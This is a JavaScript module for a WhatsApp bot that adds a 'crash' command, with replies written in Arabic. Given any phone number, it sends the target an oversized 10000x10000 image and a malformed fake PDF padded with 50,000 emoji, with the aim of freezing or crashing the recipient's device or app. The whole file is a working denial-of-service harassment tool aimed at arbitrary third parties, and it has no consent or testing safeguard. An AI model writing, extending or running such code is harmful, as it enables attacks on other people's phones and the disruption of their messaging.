const fs = require('fs');
const axios = require('axios');
const path = require('path');

module.exports = async ({ sock, msg, text, reply }) => {
  if (!text.startsWith("crash")) return;

  const parts = text.trim().split(/\s+/);
  const number = parts[1];
  const jid = `${number}@s.whatsapp.net`;

  if (!number || isNaN(number)) {
    return reply("❌ يرجى إدخال رقم صالح بعد الأمر.\nمثال: crash 9665xxxxxxx");
  }

  try {
    await reply(`🚨 جاري إرسال ملفات اختبار التعطيل إلى ${number}...`);

    // تحميل صورة ضخمة
    const imageUrl = "https://via.placeholder.com/10000x10000.jpg?text=CRASH_TEST_IMAGE";
    const imageResponse = await axios.get(imageUrl, { responseType: 'arraybuffer' });
    const imageBuffer = Buffer.from(imageResponse.data, 'binary');

    await sock.sendMessage(jid, {
      image: imageBuffer,
      caption: "📸 صورة ضخمة لاختبار قدرة الجهاز"
    });

    // إنشاء PDF كبير جدًا
    const longText = '🔥'.repeat(50000);
    const fakePdf = Buffer.from(`
      %PDF-1.4
      1 0 obj
      << /Type /Catalog /Pages 2 0 R >>
      endobj
      2 0 obj
      << /Type /Pages /Kids [3 0 R] /Count 1 >>
      endobj
      3 0 obj
      << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
         /Contents 4 0 R /Resources << >> >>
      endobj
      4 0 obj
      << /Length ${longText.length} >>
      stream
      ${longText}
      endstream
      endobj
      xref
      0 5
      0000000000 65535 f
      0000000010 00000 n
      0000000065 00000 n
      0000000124 00000 n
      0000000220 00000 n
      trailer
      << /Root 1 0 R /Size 5 >>
      startxref
      300
      %%EOF
    `);

    await sock.sendMessage(jid, {
      document: fakePdf,
      mimetype: "application/pdf",
      fileName: "crash_test_file.pdf"
    });

    await reply(`✅ تم إرسال ملفات crash إلى ${number}`);

  } catch (err) {
    console.error(err);
    await reply(`❌ فشل الإرسال إلى: ${number}`);
  }
};
